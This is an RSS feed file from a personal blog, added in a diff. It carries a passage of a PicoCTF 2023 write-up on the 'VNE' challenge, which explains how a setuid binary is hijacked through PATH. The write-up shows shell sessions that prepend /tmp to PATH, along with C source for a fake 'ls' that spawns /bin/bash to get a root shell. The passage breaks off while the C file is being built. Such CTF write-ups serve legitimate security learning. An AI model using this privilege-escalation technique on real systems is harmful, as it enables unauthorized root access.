@@ -1,0 +1,255 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Shuban Pal</title><link>https://shuban-789.github.io/</link><description>Recent content on Shuban Pal</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Sun, 06 Mar 2022 00:00:00 +0000</lastBuildDate><atom:link href="https://shuban-789.github.io/index.xml" rel="self" type="application/rss+xml"/><item><title>PicoCTF 2023 Binary Exploitation: VNE</title><link>https://shuban-789.github.io/p/picoctf-vne/</link><pubDate>Sun, 06 Mar 2022 00:00:00 +0000</pubDate><guid>https://shuban-789.github.io/p/picoctf-vne/</guid><description>&lt;img src="https://shuban-789.github.io/p/picoctf-vne/cover.jpg" alt="Featured image of post PicoCTF 2023 Binary Exploitation: VNE" />&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">📁Category: Binary Exploitation
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">📄Files: N/A
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">💻Server Connections: Yes
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">🏷️Tags: bash, env, injection
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">📃Description: We&amp;#39;ve got a binary that can list directories as root, try it
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">out !! Additional details will be available after launching your challenge
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">instance.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">1️⃣Hint 1: Have you checked the contents of the /root folder?
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">2️⃣Hint 2: Find a way to add more instruction to ls
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h3 id="takeaways-from-hints-description-and-tags">Takeaways from hints, description, and tags:
+&lt;/h3>&lt;ul>
+&lt;li>Something important is in the /root file (the flag)&lt;/li>
+&lt;li>We will have to use environment variables&lt;/li>
+&lt;li>The binary lists contents of a directory as root&lt;/li>
+&lt;li>We need to inject code into “ls”&lt;/li>
+&lt;/ul>
+&lt;h2 id="phase-1-recon-">Phase 1: Recon 🔍
+&lt;/h2>&lt;p>It is important to get familiar with the machine we log into so that we can find important assets such as possible vulnerabilities, which we may be able to exploit to get us root access.&lt;/p>
+&lt;h3 id="what-do-we-notice">What do we notice?
+&lt;/h3>&lt;ul>
+&lt;li>A binary that lists a directory as root&lt;/li>
+&lt;li>Why this is important: It does it as root via an SUID bit, because the root user made the executable&lt;/li>
+&lt;li>How it works: It takes the input for the directory as an environment variable&lt;/li>
+&lt;li>Other important takeaways: If it is listing the contents of a directory, it is most probably doing something with the ls binary&lt;/li>
+&lt;/ul>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;span class="lnt">7
+&lt;/span>&lt;span class="lnt">8
+&lt;/span>&lt;span class="lnt">9
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">ctf-player@pico-chall$ ls
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">bin
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ctf-player@pico-chall$ file bin
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">bin: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l d-linux-x86-64.so.2, BuildID[shal]=202cb71538089bb22aa22d5d3f8f77a8a94a826f, for GNU/Linux 3.2.0, not stripp
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ctf-player@pico-chall$ ls -l
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ed
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">total 20
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">-rwsr-xr-x 1 root root 18752 Aug 4 2023 bin
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ctf-player@pico-chall$
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;blockquote>
+&lt;p>SUID, short for Set User ID, is a special permission that can be assigned to executable files. When an executable file has the SUID permission enabled, it allows users who execute the file to temporarily assume the privileges of the file&amp;rsquo;s owner.&lt;/p>&lt;/blockquote>
+&lt;h2 id="phase-2-constructing-a-plan-">Phase 2: Constructing a Plan 🛠️
+&lt;/h2>&lt;p>Using the information we have gathered, we can try to assess vulnerabilities on our target system. So far, we have thought of environment variable injection, but now it is time for us to plot out this plan.&lt;/p>
+&lt;h3 id="the-plan">The Plan
+&lt;/h3>&lt;p>We make our own ls binary that spawns a shell. Since the file has an SUID, this will give us a root shell if the binary we are manipulating uses ls (in which according to the hints, it does).&lt;/p>
+&lt;p>There are however, some rather huge obstacles&lt;/p>
+&lt;blockquote>
+&lt;p>Q1: How would we execute this plan so that the binary we are manipulating thinks our ls binary is the real ls binary?&lt;/p>&lt;/blockquote>
+&lt;blockquote>
+&lt;p>A1: We could exploit the &lt;code>PATH&lt;/code> environment variable. Many hints and tags tell us that the exploit has something to do
+with environment variables and the ls executable which the SUID binary is most likely using for its operations.&lt;/p>&lt;/blockquote>
+&lt;blockquote>
+&lt;p>Q2: What directory should we put our binary into?&lt;/p>&lt;/blockquote>
+&lt;blockquote>
+&lt;p>A2: The answer is /tmp. A directory with read, write, and execute permissions for everyone. This is perfect as it will
+be the perfect soil to plant our C code in.&lt;/p>&lt;/blockquote>
+&lt;h3 id="the-theory">The Theory:
+&lt;/h3>&lt;p>When &amp;ldquo;ls&amp;rdquo; is typed into the command line, the system looks through path for an executable with the name &amp;ldquo;ls&amp;rdquo;. So in our injected PATH, because &lt;code>/tmp&lt;/code> is first, when the binary which runs ls as root runs &amp;ldquo;ls&amp;rdquo; as root it wil run our binary as root which will run /bin/bash root.&lt;/p>
+&lt;p>&lt;img src="https://github.com/shuban-789/PicoPwnbooks-BinaryExploitation/assets/67974101/9525b700-e39d-4ec6-a2b6-62fe0edec152"
+loading="lazy"
+alt="image"
+>&lt;/p>
+&lt;h2 id="phase-3-execution-">Phase 3: Execution 🧀
+&lt;/h2>&lt;p>First, let&amp;rsquo;s log onto our machine. To logon, we will need to use ssh with the command format of:&lt;/p>
+&lt;p>&lt;code>ssh -p &amp;lt;port&amp;gt; &amp;lt;user&amp;gt;@&amp;lt;ip&amp;gt;&lt;/code>&lt;/p>
+&lt;p>After logging on, let’s list our environment variables, and try editing the PATH.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;span class="lnt">28
+&lt;/span>&lt;span class="lnt">29
+&lt;/span>&lt;span class="lnt">30
+&lt;/span>&lt;span class="lnt">31
+&lt;/span>&lt;span class="lnt">32
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-gdscript3" data-lang="gdscript3">&lt;span class="line">&lt;span class="cl">&lt;span class="n">ctf&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">player&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="n">pico&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">chall&lt;/span>&lt;span class="o">$&lt;/span> &lt;span class="n">env&lt;/span> &lt;span class="n">SHELL&lt;/span>&lt;span class="o">=/&lt;/span>&lt;span class="n">bin&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">bash&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">PWD&lt;/span>&lt;span class="o">=/&lt;/span>&lt;span class="n">home&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">ctf&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">player&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">LOGNAME&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">ctf&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">player&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">MOTD_SHOWN&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">pam&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">HOME&lt;/span>&lt;span class="o">=/&lt;/span>&lt;span class="n">home&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">ctf&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">player&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">LANG&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">C&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">UTF&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">8&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">SSH_CONNECTION&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mf">127.0&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="mf">0.1&lt;/span> &lt;span class="mi">55826&lt;/span> &lt;span class="mf">127.0&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="mf">0.1&lt;/span> &lt;span class="mi">22&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">TERM&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">xterm&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">256&lt;/span>&lt;span class="n">color&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">USER&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">ctf&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">player&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">SHLVL&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">1&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">PS1&lt;/span>&lt;span class="o">=&lt;/span>\&lt;span class="p">[&lt;/span>\&lt;span class="n">e&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">35&lt;/span>&lt;span class="n">m&lt;/span>\&lt;span class="p">]&lt;/span>\&lt;span class="n">u&lt;/span>\&lt;span class="p">[&lt;/span>\&lt;span class="n">e&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">m&lt;/span>\&lt;span class="p">]&lt;/span>&lt;span class="err">@&lt;/span>\&lt;span class="p">[&lt;/span>\&lt;span class="n">e&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">35&lt;/span>&lt;span class="n">m&lt;/span>\&lt;span class="p">]&lt;/span>&lt;span class="n">pico&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">chall&lt;/span>\&lt;span class="p">[&lt;/span>\&lt;span class="n">e&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">m&lt;/span>\&lt;span class="p">]&lt;/span>&lt;span class="o">$&lt;/span> &lt;span class="n">SSH_CLIENT&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mf">127.0&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="mf">0.1&lt;/span> &lt;span class="mi">55826&lt;/span> &lt;span class="mi">22&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">PATH&lt;/span>&lt;span class="o">=/&lt;/span>&lt;span class="n">usr&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">local&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">sbin&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">usr&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">local&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">bin&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">usr&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">sbin&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">usr&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">bin&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">sbin&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">bin&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">usr&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">games&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">usr&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">local&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">games&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">snap&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">bin&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">SSH_TTY&lt;/span>&lt;span class="o">=/&lt;/span>&lt;span class="n">dev&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">pts&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="mi">0&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">_&lt;/span>&lt;span class="o">=/&lt;/span>&lt;span class="n">usr&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">bin&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">env&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">ctf&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">player&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="n">pico&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">chall&lt;/span>&lt;span class="o">$&lt;/span> &lt;span class="k">export&lt;/span> &lt;span class="n">PATH&lt;/span>&lt;span class="o">=/&lt;/span>&lt;span class="n">tmp&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">usr&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">local&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">sbin&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">usr&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">local&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">bin&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">usr&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">sbin&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">usr&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">bin&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">sbin&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">bin&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">usr&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">ga&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">mes&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">usr&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">local&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">games&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">snap&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">bin&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">ctf&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">player&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="n">pico&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">chall&lt;/span>&lt;span class="o">$&lt;/span> &lt;span class="n">env&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">SHELL&lt;/span>&lt;span class="o">=/&lt;/span>&lt;span class="n">bin&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">bash&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">PWD&lt;/span>&lt;span class="o">=/&lt;/span>&lt;span class="n">home&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">ctf&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">player&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">LOGNAME&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">ctf&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">player&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">MOTD_SHOWN&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">pam&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">HOME&lt;/span>&lt;span class="o">=/&lt;/span>&lt;span class="n">home&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">ctf&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">player&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">LANG&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">C&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">UTF&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">8&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">SSH_CONNECTION&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mf">127.0&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="mf">0.1&lt;/span> &lt;span class="mi">55826&lt;/span> &lt;span class="mf">127.0&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="mf">0.1&lt;/span> &lt;span class="mi">22&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">TERM&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">xterm&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">256&lt;/span>&lt;span class="n">color&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">USER&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">ctf&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">player&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">SHLVL&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">1&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">PS1&lt;/span>&lt;span class="o">=&lt;/span>\&lt;span class="p">[&lt;/span>\&lt;span class="n">e&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">35&lt;/span>&lt;span class="n">m&lt;/span>\&lt;span class="p">]&lt;/span>\&lt;span class="n">u&lt;/span>\&lt;span class="p">[&lt;/span>\&lt;span class="n">e&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">m&lt;/span>\&lt;span class="p">]&lt;/span>&lt;span class="err">@&lt;/span>\&lt;span class="p">[&lt;/span>\&lt;span class="n">e&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">35&lt;/span>&lt;span class="n">m&lt;/span>\&lt;span class="p">]&lt;/span>&lt;span class="n">pico&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">chall&lt;/span>\&lt;span class="p">[&lt;/span>\&lt;span class="n">e&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="n">m&lt;/span>\&lt;span class="p">]&lt;/span>&lt;span class="o">$&lt;/span> &lt;span class="n">SSH_CLIENT&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mf">127.0&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="mf">0.1&lt;/span> &lt;span class="mi">55826&lt;/span> &lt;span class="mi">22&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">PATH&lt;/span>&lt;span class="o">=/&lt;/span>&lt;span class="n">tmp&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">usr&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">local&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">sbin&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">usr&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">local&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">bin&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">usr&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">sbin&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">usr&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">bin&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">sbin&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">bin&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">usr&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">games&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">usr&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">local&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">games&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">snap&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">bin&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">SSH_TTY&lt;/span>&lt;span class="o">=/&lt;/span>&lt;span class="n">dev&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">pts&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="mi">0&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">_&lt;/span>&lt;span class="o">=/&lt;/span>&lt;span class="n">usr&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">bin&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="n">env&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">ctf&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">player&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="n">pico&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="n">chall&lt;/span>&lt;span class="o">$&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>It looks like the injection worked, so we can move on to making our fake ls executable.&lt;/p>
+&lt;p>Finally, we need to make our fake ls binary containing this C code:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;span class="lnt">7
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-c" data-lang="c">&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;stdio.h&amp;gt;&lt;/span>&lt;span class="cp">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">#include&lt;/span> &lt;span class="cpf">&amp;lt;stdlib.h&amp;gt;&lt;/span>&lt;span class="cp">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="cp">&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kt">int&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">system&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;/bin/bash&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;br>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;span class="lnt">7
+&lt;/span>&lt;span class="lnt">8
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">ctf-player@pico-chall$ touch ls.c
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ctf-player@pico-chall$ echo &amp;#34;#include &amp;lt;stdio.h&amp;gt;&amp;#34; &amp;gt;&amp;gt; ls.c
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ctf-player@pico-chall$ echo &amp;#34;#include &amp;lt;stdlib.h&amp;gt;&amp;#34; &amp;gt;&amp;gt; ls.c
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ctf-player@pico-chall$ echo &amp;#34;int main()&amp;#34; &amp;gt;&amp;gt; ls.c
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">ctf-player@pico-chall$ echo &amp;#34;{&amp;#34; &amp;gt;&amp;gt; ls.c
